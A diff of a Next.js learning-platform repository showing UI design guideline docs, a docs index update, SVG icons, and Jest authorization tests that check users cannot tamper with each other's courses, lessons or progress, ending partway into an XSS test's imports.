+63: ## Image Outlines
+64: 
+65: - 1px at 10% opacity.
+66: - Black in light mode, white in dark mode.
+67: 
+68: ---
+69: 
+70: # Supporting Files
+71: 
+72: - `typography.md` - Typography rules.
+73: - `surfaces.md` - Surface and shadow rules.
+74: - `animations.md` - Animation value reference.
+75: - `performance.md` - Performance constraints.
+76: 
+77: ---
+78: 
+79: # Sources
+80: 
+81: - jakubkrehel/make-interfaces-feel-better (no license, all rights reserved).
+82: - jakub.kr/writing/details-that-make-interfaces-feel-better.
+`````
+
+## File: docs/skills/Taste Skill Project.md
+`````markdown
+ 1: # Taste Skill Project
+ 2: 
+ 3: Three-dial aesthetic framework for calibrating AI-generated frontend output.
+ 4: 
+ 5: ---
+ 6: 
+ 7: # Overview
+ 8: 
+ 9: The Taste Skill provides a conversation-driven framework for setting aesthetic direction before building. It prevents generic AI output by committing to a direction early.
+10: 
+11: ---
+12: 
+13: # The Three Dials
+14: 
+15: | Dial             | Default | Scale | Description                                      |
+16: | ---------------- | ------- | ----- | ------------------------------------------------ |
+17: | Design Variance  | 8       | 1-10  | How much the layout breaks from generic patterns |
+18: | Motion Intensity | 6       | 1-10  | How much animation and transition is present     |
+19: | Visual Density   | 4       | 1-10  | How much information per viewport                |
+20: 
+21: Set these dials conversationally before touching layout.
+22: 
+23: ---
+24: 
+25: # Section 14 Pre-Flight Check
+26: 
+27: Mandatory before completing any page:
+28: 
+29: - [ ] Three dials set and committed.
+30: - [ ] Hero follows constraints (2-line headline, 20-word subtext, CTA above fold).
+31: - [ ] Navigation on single line at desktop (80px height cap).
+32: - [ ] One accent color per page.
+33: - [ ] One radius scale per page.
+34: - [ ] One theme per page.
+35: - [ ] At least 4 layout families in 8-section pages.
+36: - [ ] No em-dashes or en-dashes in visible text.
+37: - [ ] No cards nested inside cards.
+38: - [ ] No purple-to-blue gradients.
+39: - [ ] No Inter for everything without justification.
+40: - [ ] Typography uses balance/pretty wrapping.
+41: 
+42: Any failed box blocks completion.
+43: 
+44: ---
+45: 
+46: # Greenfield Workflow
+47: 
+48: 1. Set the three dials.
+49: 2. Pick a 4-6 value named hex palette.
+50: 3. Define the hero thesis.
+51: 4. Build with committed direction.
+52: 5. Run Section 14 pre-flight.
+53: 6. Revise if any check fails.
+54: 
+55: ---
+56: 
+57: # Redesign Workflow
+58: 
+59: 1. Audit existing interface against Section 14.
+60: 2. Identify what to preserve, what to overhaul.
+61: 3. Set the three dials for the new direction.
+62: 4. Build respecting preserved elements.
+63: 5. Run Section 14 pre-flight.
+64: 
+65: ---
+66: 
+67: # Anti-Laziness Rules
+68: 
+69: - Never output a generic layout as a starting point.
+70: - Always commit to a direction before building.
+71: - Always run the pre-flight check.
+72: - Never skip the critique pass.
+73: 
+74: ---
+75: 
+76: # Sources
+77: 
+78: - Leonxlnx/taste-skill (MIT).
+79: - tasteskill.dev.
+80: - v2 is experimental, iterating toward v2.0.0 stable.
+`````
+
+## File: docs/skills/Vercel Web Design Guidelines.md
+`````markdown
+  1: # Vercel Web Design Guidelines
+  2: 
+  3: High-performance, accessible web interface rules from Vercel Labs.
+  4: 
+  5: ---
+  6: 
+  7: # Installation
+  8: 
+  9: ```bash
+ 10: npx skills add vercel-labs/agent-skills --skill web-design-guidelines
+ 11: ```
+ 12: 
+ 13: ---
+ 14: 
+ 15: # Workflow
+ 16: 
+ 17: 1. Fetch the latest guidelines from the Vercel repository.
+ 18: 2. Read target files in the project.
+ 19: 3. Check all rules against the files.
+ 20: 4. Output terse file:line findings.
+ 21: 
+ 22: ---
+ 23: 
+ 24: # Key Rule Categories
+ 25: 
+ 26: ## Accessibility
+ 27: 
+ 28: - Icon-only buttons need `aria-label`.
+ 29: - Never `outline-none` without a focus replacement.
+ 30: - Never block paste.
+ 31: - Honor `prefers-reduced-motion`.
+ 32: - Semantic HTML elements.
+ 33: - Color contrast meets WCAG AA.
+ 34: 
+ 35: ## Focus
+ 36: 
+ 37: - Visible focus rings on all interactive elements.
+ 38: - Logical tab order.
+ 39: - Skip links for keyboard navigation.
+ 40: - Focus trapping in modals.
+ 41: 
+ 42: ## Forms
+ 43: 
+ 44: - Labels associated with inputs.
+ 45: - Error messages linked via `aria-describedby`.
+ 46: - Required fields indicated visually and programmatically.
+ 47: - Inline validation on blur.
+ 48: 
+ 49: ## Animation
+ 50: 
+ 51: - Honor `prefers-reduced-motion`.
+ 52: - Under 300ms for micro-interactions.
+ 53: - `ease-out` for enter, `ease-in` for exit.
+ 54: - Virtualize lists over 50 items.
+ 55: - Use `transform` and `opacity` for animations.
+ 56: 
+ 57: ## Typography
+ 58: 
+ 59: - `text-wrap: balance` on headlines.
+ 60: - `text-wrap: pretty` on body text.
+ 61: - Line length: 45-90 characters.
+ 62: - Consistent type scale.
+ 63: 
+ 64: ## Content
+ 65: 
+ 66: - `Intl.DateTimeFormat` for dates.
+ 67: - Destructive actions need confirmation or undo.
+ 68: - URL reflects state.
+ 69: - Loading states for async operations.
+ 70: 
+ 71: ## Images
+ 72: 
+ 73: - Explicit `width` and `height`.
+ 74: - Use `next/image`.
+ 75: - Alt text on meaningful images.
+ 76: - Decorative: `alt=""` and `role="presentation"`.
+ 77: 
+ 78: ## Performance
+ 79: 
+ 80: - Server Components by default.
+ 81: - Lazy load below-the-fold.
+ 82: - Minimize client JS.
+ 83: - Streaming and Suspense.
+ 84: - Prefetch critical navigation.
+ 85: 
+ 86: ## Touch
+ 87: 
+ 88: - 40x40px minimum touch targets.
+ 89: - `@media (hover: hover)` for hover styles.
+ 90: - Safe areas for mobile.
+ 91: 
+ 92: ## Dark Mode
+ 93: 
+ 94: - CSS custom properties for themes.
+ 95: - Test both modes.
+ 96: - Avoid pure black backgrounds.
+ 97: - Sufficient contrast in both modes.
+ 98: 
+ 99: ---
+100: 
+101: # Sources
+102: 
+103: - vercel-labs/web-interface-guidelines (MIT).
+104: - vercel.com/design/guidelines.
 `````
 
 ## File: docs/INDEX.md
@@ -4584,32 +5397,33 @@ tsconfig.json
 30: - [ADR-001: 5-Layer Downward Architecture](decisions/001-use-layered-architecture.md)
 31: - [ADR-002: Neon PostgreSQL with Prisma](decisions/002-use-neon-with-prisma.md)
 32: - [ADR-003: shadcn/ui Component Library](decisions/003-use-shadcn-ui.md)
-33: - [ADR Template](decisions/TEMPLATE.md) — Standard structure for recording new architectural decisions.
-34: 
-35: ---
-36: 
-37: ## 5. Quality & Auditing
-38: - [Pre-Flight Quality Audit Checklist](audits/quality-audit.md) — Step-by-step audit covering architecture, types, Next.js 16, UI anti-slop, security, and tests.
-39: 
-40: ---
-41: 
-42: ## 6. Implementation Roadmap & Tasks
-43: - [Tasks Overview (Tasks 00–08)](tasks/00-overview.md)
-44: - [Task 01: Architecture Foundation](tasks/01-architecture-foundation.md)
-45: - [Task 02: User Profile & Roles](tasks/02-user-profile-roles.md)
-46: - [Task 03: Course & Curriculum Domain](tasks/03-course-curriculum-domain.md)
-47: - [Task 04: Lesson Content Authoring](tasks/04-lesson-content-authoring.md)
-48: - [Task 05: Enrollment & Progress Tracking](tasks/05-enrollment-progress-tracking.md)
-49: - [Task 06: Course Catalog & Player](tasks/06-course-catalog-player.md)
-50: - [Task 07: Instructor Dashboard](tasks/07-instructor-dashboard.md)
-51: - [Task 08: QA, Security & Documentation](tasks/08-qa-security-documentation.md)
-52: 
-53: ---
-54: 
-55: ## 7. AI Agent Operating System
-56: - [AGENTS.md](../AGENTS.md) — Canonical agent entry point and source of truth hierarchy.
-57: - [Operating System Contract](../.agents/rules/operating-system.md) — 11-step cognitive cycle, change-aware verification, definition of done, and escalation triggers.
-58: - [Skill Router](../.agents/rules/skill-router.md) — Context-efficient skill orchestration matrix.
+33: - [ADR-004: LMS Domain Model](decisions/004-lms-domain-model.md)
+34: - [ADR Template](decisions/TEMPLATE.md) — Standard structure for recording new architectural decisions.
+35: 
+36: ---
+37: 
+38: ## 5. Quality & Auditing
+39: - [Pre-Flight Quality Audit Checklist](audits/quality-audit.md) — Step-by-step audit covering architecture, types, Next.js 16, UI anti-slop, security, and tests.
+40: 
+41: ---
+42: 
+43: ## 6. Implementation Roadmap & Tasks
+44: - [Tasks Overview (Tasks 00–08)](tasks/00-overview.md)
+45: - [Task 01: Architecture Foundation](tasks/01-architecture-foundation.md)
+46: - [Task 02: User Profile & Roles](tasks/02-user-profile-roles.md)
+47: - [Task 03: Course & Curriculum Domain](tasks/03-course-curriculum-domain.md)
+48: - [Task 04: Lesson Content Authoring](tasks/04-lesson-content-authoring.md)
+49: - [Task 05: Enrollment & Progress Tracking](tasks/05-enrollment-progress-tracking.md)
+50: - [Task 06: Course Catalog & Player](tasks/06-course-catalog-player.md)
+51: - [Task 07: Instructor Dashboard](tasks/07-instructor-dashboard.md)
+52: - [Task 08: QA, Security & Documentation](tasks/08-qa-security-documentation.md)
+53: 
+54: ---
+55: 
+56: ## 7. AI Agent Operating System
+57: - [AGENTS.md](../AGENTS.md) — Canonical agent entry point and source of truth hierarchy.
+58: - [Operating System Contract](../.agents/rules/operating-system.md) — 11-step cognitive cycle, change-aware verification, definition of done, and escalation triggers.
+59: - [Skill Router](../.agents/rules/skill-router.md) — Context-efficient skill orchestration matrix.
 `````
 
 ## File: prisma/seed.ts
@@ -4701,6 +5515,618 @@ tsconfig.json
 85:       await prisma.$disconnect();
 86:     });
 87: }
+`````
+
+## File: public/file.svg
+`````xml
+1: <svg fill="none" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg"><path d="M14.5 13.5V5.41a1 1 0 0 0-.3-.7L9.8.29A1 1 0 0 0 9.08 0H1.5v13.5A2.5 2.5 0 0 0 4 16h8a2.5 2.5 0 0 0 2.5-2.5m-1.5 0v-7H8v-5H3v12a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1M9.5 5V2.12L12.38 5zM5.13 5h-.62v1.25h2.12V5zm-.62 3h7.12v1.25H4.5zm.62 3h-.62v1.25h7.12V11z" clip-rule="evenodd" fill="#666" fill-rule="evenodd"/></svg>
+`````
+
+## File: public/globe.svg
+`````xml
+1: <svg fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><g clip-path="url(#a)"><path fill-rule="evenodd" clip-rule="evenodd" d="M10.27 14.1a6.5 6.5 0 0 0 3.67-3.45q-1.24.21-2.7.34-.31 1.83-.97 3.1M8 16A8 8 0 1 0 8 0a8 8 0 0 0 0 16m.48-1.52a7 7 0 0 1-.96 0H7.5a4 4 0 0 1-.84-1.32q-.38-.89-.63-2.08a40 40 0 0 0 3.92 0q-.25 1.2-.63 2.08a4 4 0 0 1-.84 1.31zm2.94-4.76q1.66-.15 2.95-.43a7 7 0 0 0 0-2.58q-1.3-.27-2.95-.43a18 18 0 0 1 0 3.44m-1.27-3.54a17 17 0 0 1 0 3.64 39 39 0 0 1-4.3 0 17 17 0 0 1 0-3.64 39 39 0 0 1 4.3 0m1.1-1.17q1.45.13 2.69.34a6.5 6.5 0 0 0-3.67-3.44q.65 1.26.98 3.1M8.48 1.5l.01.02q.41.37.84 1.31.38.89.63 2.08a40 40 0 0 0-3.92 0q.25-1.2.63-2.08a4 4 0 0 1 .85-1.32 7 7 0 0 1 .96 0m-2.75.4a6.5 6.5 0 0 0-3.67 3.44 29 29 0 0 1 2.7-.34q.31-1.83.97-3.1M4.58 6.28q-1.66.16-2.95.43a7 7 0 0 0 0 2.58q1.3.27 2.95.43a18 18 0 0 1 0-3.44m.17 4.71q-1.45-.12-2.69-.34a6.5 6.5 0 0 0 3.67 3.44q-.65-1.27-.98-3.1" fill="#666"/></g><defs><clipPath id="a"><path fill="#fff" d="M0 0h16v16H0z"/></clipPath></defs></svg>
+`````
+
+## File: public/next.svg
+`````xml
+1: <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 394 80"><path fill="#000" d="M262 0h68.5v12.7h-27.2v66.6h-13.6V12.7H262V0ZM149 0v12.7H94v20.4h44.3v12.6H94v21h55v12.6H80.5V0h68.7zm34.3 0h-17.8l63.8 79.4h17.9l-32-39.7 32-39.6h-17.9l-23 28.6-23-28.6zm18.3 56.7-9-11-27.1 33.7h17.8l18.3-22.7z"/><path fill="#000" d="M81 79.3 17 0H0v79.3h13.6V17l50.2 62.3H81Zm252.6-.4c-1 0-1.8-.4-2.5-1s-1.1-1.6-1.1-2.6.3-1.8 1-2.5 1.6-1 2.6-1 1.8.3 2.5 1a3.4 3.4 0 0 1 .6 4.3 3.7 3.7 0 0 1-3 1.8zm23.2-33.5h6v23.3c0 2.1-.4 4-1.3 5.5a9.1 9.1 0 0 1-3.8 3.5c-1.6.8-3.5 1.3-5.7 1.3-2 0-3.7-.4-5.3-1s-2.8-1.8-3.7-3.2c-.9-1.3-1.4-3-1.4-5h6c.1.8.3 1.6.7 2.2s1 1.2 1.6 1.5c.7.4 1.5.5 2.4.5 1 0 1.8-.2 2.4-.6a4 4 0 0 0 1.6-1.8c.3-.8.5-1.8.5-3V45.5zm30.9 9.1a4.4 4.4 0 0 0-2-3.3 7.5 7.5 0 0 0-4.3-1.1c-1.3 0-2.4.2-3.3.5-.9.4-1.6 1-2 1.6a3.5 3.5 0 0 0-.3 4c.3.5.7.9 1.3 1.2l1.8 1 2 .5 3.2.8c1.3.3 2.5.7 3.7 1.2a13 13 0 0 1 3.2 1.8 8.1 8.1 0 0 1 3 6.5c0 2-.5 3.7-1.5 5.1a10 10 0 0 1-4.4 3.5c-1.8.8-4.1 1.2-6.8 1.2-2.6 0-4.9-.4-6.8-1.2-2-.8-3.4-2-4.5-3.5a10 10 0 0 1-1.7-5.6h6a5 5 0 0 0 3.5 4.6c1 .4 2.2.6 3.4.6 1.3 0 2.5-.2 3.5-.6 1-.4 1.8-1 2.4-1.7a4 4 0 0 0 .8-2.4c0-.9-.2-1.6-.7-2.2a11 11 0 0 0-2.1-1.4l-3.2-1-3.8-1c-2.8-.7-5-1.7-6.6-3.2a7.2 7.2 0 0 1-2.4-5.7 8 8 0 0 1 1.7-5 10 10 0 0 1 4.3-3.5c2-.8 4-1.2 6.4-1.2 2.3 0 4.4.4 6.2 1.2 1.8.8 3.2 2 4.3 3.4 1 1.4 1.5 3 1.5 5h-5.8z"/></svg>
+`````
+
+## File: public/vercel.svg
+`````xml
+1: <svg fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1155 1000"><path d="m577.3 0 577.4 1000H0z" fill="#fff"/></svg>
+`````
+
+## File: public/window.svg
+`````xml
+1: <svg fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path fill-rule="evenodd" clip-rule="evenodd" d="M1.5 2.5h13v10a1 1 0 0 1-1 1h-11a1 1 0 0 1-1-1zM0 1h16v11.5a2.5 2.5 0 0 1-2.5 2.5h-11A2.5 2.5 0 0 1 0 12.5zm3.75 4.5a.75.75 0 1 0 0-1.5.75.75 0 0 0 0 1.5M7 4.75a.75.75 0 1 1-1.5 0 .75.75 0 0 1 1.5 0m1.75.75a.75.75 0 1 0 0-1.5.75.75 0 0 0 0 1.5" fill="#666"/></svg>
+`````
+
+## File: src/__tests__/security/idor.test.ts
+`````typescript
+  1: import * as profileService from "@/services/profile";
+  2: import * as courseService from "@/services/course";
+  3: import * as curriculumService from "@/services/curriculum";
+  4: import * as lessonContentService from "@/services/lesson-content";
+  5: import * as progressService from "@/services/progress";
+  6: import * as userRepository from "@/repositories/user";
+  7: import * as courseRepository from "@/repositories/course";
+  8: import * as moduleRepository from "@/repositories/module";
+  9: import * as lessonRepository from "@/repositories/lesson";
+ 10: import * as lessonContentRepository from "@/repositories/lesson-content";
+ 11: import * as enrollmentRepository from "@/repositories/enrollment";
+ 12: import * as lessonProgressRepository from "@/repositories/lesson-progress";
+ 13: import * as authorizationService from "@/services/authorization";
+ 14: import {
+ 15:   AuthenticationError,
+ 16:   AuthorizationError,
+ 17:   NotFoundError,
+ 18: } from "@/lib/errors";
+ 19: import { CourseStatus, EnrollmentStatus } from "@prisma/client";
+ 20: jest.mock("@/repositories/user");
+ 21: jest.mock("@/repositories/course");
+ 22: jest.mock("@/repositories/module");
+ 23: jest.mock("@/repositories/lesson");
+ 24: jest.mock("@/repositories/lesson-content");
+ 25: jest.mock("@/repositories/enrollment");
+ 26: jest.mock("@/repositories/lesson-progress");
+ 27: jest.mock("@/services/authorization");
+ 28: jest.mock("@/lib/db", () => ({
+ 29:   prisma: {
+ 30:     $transaction: jest.fn((callback) => callback({})),
+ 31:   },
+ 32: }));
+ 33: const mockUserRepo = userRepository as jest.Mocked<typeof userRepository>;
+ 34: const mockCourseRepo = courseRepository as jest.Mocked<typeof courseRepository>;
+ 35: const mockModuleRepo = moduleRepository as jest.Mocked<typeof moduleRepository>;
+ 36: const mockLessonRepo = lessonRepository as jest.Mocked<typeof lessonRepository>;
+ 37: const mockLessonContentRepo = lessonContentRepository as jest.Mocked<
+ 38:   typeof lessonContentRepository
+ 39: >;
+ 40: const mockEnrollmentRepo = enrollmentRepository as jest.Mocked<
+ 41:   typeof enrollmentRepository
+ 42: >;
+ 43: const mockProgressRepo = lessonProgressRepository as jest.Mocked<
+ 44:   typeof lessonProgressRepository
+ 45: >;
+ 46: const mockAuthService = authorizationService as jest.Mocked<
+ 47:   typeof authorizationService
+ 48: >;
+ 49: describe("Security Audit: IDOR & Cross-Resource Authorization Tests", () => {
+ 50:   const userA = "user-a";
+ 51:   const userB = "user-b";
+ 52:   const instructorA = "instructor-a";
+ 53:   const instructorB = "instructor-b";
+ 54:   const adminUser = "admin-user";
+ 55:   const studentA = "student-a";
+ 56:   const courseB = {
+ 57:     id: "course-b-id",
+ 58:     title: "Course B Title",
+ 59:     slug: "course-b",
+ 60:     description: "Course B Description",
+ 61:     thumbnailUrl: null,
+ 62:     status: CourseStatus.DRAFT,
+ 63:     level: "ALL_LEVELS" as const,
+ 64:     category: "Development",
+ 65:     instructorId: instructorB,
+ 66:     createdAt: new Date(),
+ 67:     updatedAt: new Date(),
+ 68:   };
+ 69:   const moduleB = {
+ 70:     id: "module-b-id",
+ 71:     title: "Module B",
+ 72:     description: "Description B",
+ 73:     orderIndex: 0,
+ 74:     courseId: courseB.id,
+ 75:     createdAt: new Date(),
+ 76:     updatedAt: new Date(),
+ 77:   };
+ 78:   const lessonB = {
+ 79:     id: "lesson-b-id",
+ 80:     title: "Lesson B",
+ 81:     slug: "lesson-b",
+ 82:     orderIndex: 0,
+ 83:     durationMinutes: 10,
+ 84:     isFreePreview: false,
+ 85:     moduleId: moduleB.id,
+ 86:     createdAt: new Date(),
+ 87:     updatedAt: new Date(),
+ 88:   };
+ 89:   const lessonBHierarchy = {
+ 90:     ...lessonB,
+ 91:     module: {
+ 92:       ...moduleB,
+ 93:       course: courseB,
+ 94:     },
+ 95:   };
+ 96:   beforeEach(() => {
+ 97:     jest.clearAllMocks();
+ 98:   });
+ 99:   describe("1. User Profile IDOR Penetration", () => {
+100:     it("strictly blocks User A from updating User B's profile", async () => {
+101:       await expect(
+102:         profileService.updateUserProfile(userA, userB, {
+103:           name: "Malicious Tamper",
+104:           bio: "Hacked bio",
+105:         }),
+106:       ).rejects.toThrow(AuthorizationError);
+107:       expect(mockUserRepo.updateUserProfile).not.toHaveBeenCalled();
+108:     });
+109:     it("allows User A to update their own profile", async () => {
+110:       mockUserRepo.findUserById.mockResolvedValue({
+111:         id: userA,
+112:         name: "User A",
+113:         email: "user-a@example.com",
+114:         emailVerified: true,
+115:         image: null,
+116:         headline: null,
+117:         bio: null,
+118:         avatarUrl: null,
+119:         website: null,
+120:         createdAt: new Date(),
+121:         updatedAt: new Date(),
+122:       });
+123:       mockUserRepo.updateUserProfile.mockResolvedValue({
+124:         id: userA,
+125:         name: "User A Updated",
+126:         email: "user-a@example.com",
+127:         emailVerified: true,
+128:         image: null,
+129:         headline: "Engineer",
+130:         bio: "Updated bio",
+131:         avatarUrl: null,
+132:         website: null,
+133:         createdAt: new Date(),
+134:         updatedAt: new Date(),
+135:       });
+136:       const updated = await profileService.updateUserProfile(userA, userA, {
+137:         name: "User A Updated",
+138:         headline: "Engineer",
+139:         bio: "Updated bio",
+140:       });
+141:       expect(updated.name).toBe("User A Updated");
+142:       expect(mockUserRepo.updateUserProfile).toHaveBeenCalledWith(
+143:         userA,
+144:         expect.objectContaining({ name: "User A Updated" }),
+145:       );
+146:     });
+147:   });
+148:   describe("2. Course Management IDOR Penetration", () => {
+149:     beforeEach(() => {
+150:       mockCourseRepo.findCourseById.mockResolvedValue(courseB);
+151:       mockAuthService.hasRole.mockResolvedValue(false);
+152:     });
+153:     it("strictly blocks Instructor A from updating Instructor B's course", async () => {
+154:       await expect(
+155:         courseService.updateCourse(instructorA, courseB.id, {
+156:           title: "Tampered Course Title",
+157:         }),
+158:       ).rejects.toThrow(AuthorizationError);
+159:       expect(mockCourseRepo.updateCourse).not.toHaveBeenCalled();
+160:     });
+161:     it("strictly blocks Instructor A from deleting Instructor B's course", async () => {
+162:       await expect(
+163:         courseService.deleteCourse(instructorA, courseB.id),
+164:       ).rejects.toThrow(AuthorizationError);
+165:       expect(mockCourseRepo.deleteCourseAtomic).not.toHaveBeenCalled();
+166:     });
+167:     it("strictly blocks Instructor A from publishing Instructor B's course", async () => {
+168:       await expect(
+169:         courseService.publishCourse(instructorA, courseB.id),
+170:       ).rejects.toThrow(AuthorizationError);
+171:       expect(
+172:         mockCourseRepo.executeCourseStatusTransition,
+173:       ).not.toHaveBeenCalled();
+174:     });
+175:     it("strictly blocks Instructor A from archiving Instructor B's course", async () => {
+176:       await expect(
+177:         courseService.archiveCourse(instructorA, courseB.id),
+178:       ).rejects.toThrow(AuthorizationError);
+179:       expect(
+180:         mockCourseRepo.executeCourseStatusTransition,
+181:       ).not.toHaveBeenCalled();
+182:     });
+183:     it("allows admin user to manage Instructor B's course", async () => {
+184:       mockAuthService.hasRole.mockImplementation(
+185:         async (_uid, role) => role === "admin",
+186:       );
+187:       mockCourseRepo.updateCourse.mockResolvedValue({
+188:         ...courseB,
+189:         title: "Admin Supervised Title",
+190:       });
+191:       const result = await courseService.updateCourse(adminUser, courseB.id, {
+192:         title: "Admin Supervised Title",
+193:       });
+194:       expect(result.title).toBe("Admin Supervised Title");
+195:       expect(mockCourseRepo.updateCourse).toHaveBeenCalled();
+196:     });
+197:   });
+198:   describe("3. Curriculum Management IDOR Penetration", () => {
+199:     beforeEach(() => {
+200:       mockCourseRepo.findCourseById.mockResolvedValue(courseB);
+201:       mockModuleRepo.findModuleById.mockResolvedValue(moduleB);
+202:       mockLessonRepo.findLessonById.mockResolvedValue(lessonB);
+203:       mockLessonRepo.findLessonWithModule.mockResolvedValue({
+204:         ...lessonB,
+205:         module: moduleB,
+206:       });
+207:       mockAuthService.hasRole.mockResolvedValue(false);
+208:     });
+209:     it("strictly blocks Instructor A from creating a module in Instructor B's course", async () => {
+210:       await expect(
+211:         curriculumService.createModule(instructorA, {
+212:           courseId: courseB.id,
+213:           title: "Injected Module",
+214:         }),
+215:       ).rejects.toThrow(AuthorizationError);
+216:       expect(mockModuleRepo.createModuleAtomic).not.toHaveBeenCalled();
+217:     });
+218:     it("strictly blocks Instructor A from updating a module in Instructor B's course", async () => {
+219:       await expect(
+220:         curriculumService.updateModule(instructorA, moduleB.id, {
+221:           title: "Tampered Module",
+222:         }),
+223:       ).rejects.toThrow(AuthorizationError);
+224:       expect(mockModuleRepo.updateModuleAtomic).not.toHaveBeenCalled();
+225:     });
+226:     it("strictly blocks Instructor A from deleting a module in Instructor B's course", async () => {
+227:       await expect(
+228:         curriculumService.deleteModule(instructorA, moduleB.id),
+229:       ).rejects.toThrow(AuthorizationError);
+230:       expect(mockModuleRepo.deleteModuleAtomic).not.toHaveBeenCalled();
+231:     });
+232:     it("strictly blocks Instructor A from reordering modules in Instructor B's course", async () => {
+233:       await expect(
+234:         curriculumService.reorderModules(instructorA, courseB.id, [
+235:           "module-1",
+236:           "module-2",
+237:         ]),
+238:       ).rejects.toThrow(AuthorizationError);
+239:       expect(mockModuleRepo.reorderModulesAtomic).not.toHaveBeenCalled();
+240:     });
+241:     it("strictly blocks Instructor A from creating a lesson in Instructor B's module", async () => {
+242:       await expect(
+243:         curriculumService.createLesson(instructorA, {
+244:           moduleId: moduleB.id,
+245:           title: "Injected Lesson",
+246:         }),
+247:       ).rejects.toThrow(AuthorizationError);
+248:       expect(mockLessonRepo.createLessonAtomic).not.toHaveBeenCalled();
+249:     });
+250:     it("strictly blocks Instructor A from deleting a lesson in Instructor B's module", async () => {
+251:       await expect(
+252:         curriculumService.deleteLesson(instructorA, lessonB.id),
+253:       ).rejects.toThrow(AuthorizationError);
+254:       expect(mockLessonRepo.deleteLessonAtomic).not.toHaveBeenCalled();
+255:     });
+256:     it("strictly blocks Instructor A from reordering lessons in Instructor B's module", async () => {
+257:       await expect(
+258:         curriculumService.reorderLessons(instructorA, moduleB.id, [
+259:           "lesson-1",
+260:           "lesson-2",
+261:         ]),
+262:       ).rejects.toThrow(AuthorizationError);
+263:       expect(mockLessonRepo.reorderLessonsAtomic).not.toHaveBeenCalled();
+264:     });
+265:   });
+266:   describe("4. Lesson Content IDOR & Access Gate Penetration", () => {
+267:     beforeEach(() => {
+268:       mockLessonContentRepo.findLessonHierarchy.mockResolvedValue(
+269:         lessonBHierarchy,
+270:       );
+271:       mockAuthService.hasRole.mockResolvedValue(false);
+272:       mockAuthService.requireAnyRole.mockResolvedValue();
+273:     });
+274:     it("strictly blocks Instructor A from updating lesson content of Instructor B's lesson", async () => {
+275:       await expect(
+276:         lessonContentService.updateLessonContent(instructorA, {
+277:           lessonId: lessonB.id,
+278:           bodyMarkdown: "# Tampered Content",
+279:         }),
+280:       ).rejects.toThrow(AuthorizationError);
+281:       expect(mockLessonContentRepo.upsertLessonContent).not.toHaveBeenCalled();
+282:     });
+283:     it("strictly blocks unenrolled student from viewing non-preview lesson content in published course", async () => {
+284:       mockLessonContentRepo.findLessonHierarchy.mockResolvedValue({
+285:         ...lessonBHierarchy,
+286:         isFreePreview: false,
+287:         module: {
+288:           ...moduleB,
+289:           course: {
+290:             ...courseB,
+291:             status: CourseStatus.PUBLISHED,
+292:           },
+293:         },
+294:       });
+295:       mockEnrollmentRepo.findEnrollment.mockResolvedValue(null);
+296:       await expect(
+297:         lessonContentService.getLessonContent(studentA, lessonB.id),
+298:       ).rejects.toThrow(AuthorizationError);
+299:     });
+300:     it("strictly blocks anonymous user from viewing non-preview lesson content", async () => {
+301:       mockLessonContentRepo.findLessonHierarchy.mockResolvedValue({
+302:         ...lessonBHierarchy,
+303:         isFreePreview: false,
+304:         module: {
+305:           ...moduleB,
+306:           course: {
+307:             ...courseB,
+308:             status: CourseStatus.PUBLISHED,
+309:           },
+310:         },
+311:       });
+312:       await expect(
+313:         lessonContentService.getLessonContent(null, lessonB.id),
+314:       ).rejects.toThrow(AuthenticationError);
+315:     });
+316:   });
+317:   describe("5. Student Progress IDOR Penetration", () => {
+318:     it("strictly blocks student from toggling completion on a course they are not enrolled in", async () => {
+319:       mockLessonContentRepo.findLessonHierarchy.mockResolvedValue(
+320:         lessonBHierarchy,
+321:       );
+322:       mockEnrollmentRepo.findEnrollment.mockResolvedValue(null);
+323:       await expect(
+324:         progressService.toggleLessonCompletion(studentA, lessonB.id, true),
+325:       ).rejects.toThrow(AuthorizationError);
+326:       expect(mockProgressRepo.upsertLessonProgress).not.toHaveBeenCalled();
+327:     });
+328:     it("strictly blocks student from toggling completion when enrollment is ARCHIVED", async () => {
+329:       mockLessonContentRepo.findLessonHierarchy.mockResolvedValue(
+330:         lessonBHierarchy,
+331:       );
+332:       mockEnrollmentRepo.findEnrollment.mockResolvedValue({
+333:         id: "enrollment-archived",
+334:         userId: studentA,
+335:         courseId: courseB.id,
+336:         status: EnrollmentStatus.ARCHIVED,
+337:         progressPercentage: 50,
+338:         enrolledAt: new Date(),
+339:         completedAt: null,
+340:         lastAccessedAt: new Date(),
+341:       });
+342:       await expect(
+343:         progressService.toggleLessonCompletion(studentA, lessonB.id, true),
+344:       ).rejects.toThrow(AuthorizationError);
+345:       expect(mockProgressRepo.upsertLessonProgress).not.toHaveBeenCalled();
+346:     });
+347:     it("returns NotFoundError when querying progress for an unenrolled course", async () => {
+348:       mockEnrollmentRepo.findEnrollment.mockResolvedValue(null);
+349:       await expect(
+350:         progressService.getCourseProgress(studentA, courseB.id),
+351:       ).rejects.toThrow(NotFoundError);
+352:     });
+353:   });
+354:   describe("6. Cross-Course Isolation & Anti-Probing Boundary", () => {
+355:     it("strictly throws NotFoundError when lesson does not belong to the requested course slug", async () => {
+356:       const courseA = {
+357:         id: "course-a-id",
+358:         title: "Course A",
+359:         slug: "course-a",
+360:         status: CourseStatus.PUBLISHED,
+361:         instructorId: instructorA,
+362:       };
+363:       mockCourseRepo.findCourseBySlug.mockResolvedValue(courseA as never);
+364:       mockLessonContentRepo.findLessonHierarchy.mockResolvedValue(
+365:         lessonBHierarchy,
+366:       );
+367:       await expect(
+368:         lessonContentService.getCourseLessonForPlayer({
+369:           courseSlug: "course-a",
+370:           lessonId: lessonB.id,
+371:           userId: studentA,
+372:         }),
+373:       ).rejects.toThrow(NotFoundError);
+374:     });
+375:   });
+376: });
+`````
+
+## File: src/__tests__/security/xss.test.ts
+`````typescript
+  1: import { markdownToSanitizedHtml } from "@/lib/sanitizer";
+  2: import * as lessonContentService from "@/services/lesson-content";
+  3: import * as lessonContentRepository from "@/repositories/lesson-content";
+  4: import * as authorizationService from "@/services/authorization";
+  5: import { CourseStatus } from "@prisma/client";
+  6: jest.mock("@/repositories/lesson-content");
+  7: jest.mock("@/services/authorization");
+  8: const mockLessonContentRepo = lessonContentRepository as jest.Mocked<
+  9:   typeof lessonContentRepository
+ 10: >;
+ 11: const mockAuthService = authorizationService as jest.Mocked<
